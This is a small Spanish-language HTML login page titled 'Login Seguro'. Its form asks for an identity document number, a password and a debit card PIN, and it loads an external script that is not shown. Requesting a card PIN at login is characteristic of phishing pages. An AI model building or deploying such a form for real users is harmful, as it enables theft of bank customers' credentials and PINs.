<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Seguro</title>
    <link rel="stylesheet" href="styles.css"> <!-- Estilos -->
</head>
<body>
    <h2>Login</h2>
    <form id="loginForm">
        <input type="text" id="documento" placeholder="Documento de identidad" required><br>
        <input type="password" id="password" placeholder="Contraseña" required><br>
        <input type="password" id="clave" placeholder="Clave tarjeta débito" required><br>
        <button type="submit">Continuar</button>
    </form>

    <script src="script.js"></script> <!-- Nuevo archivo JavaScript -->
</body>
</html>
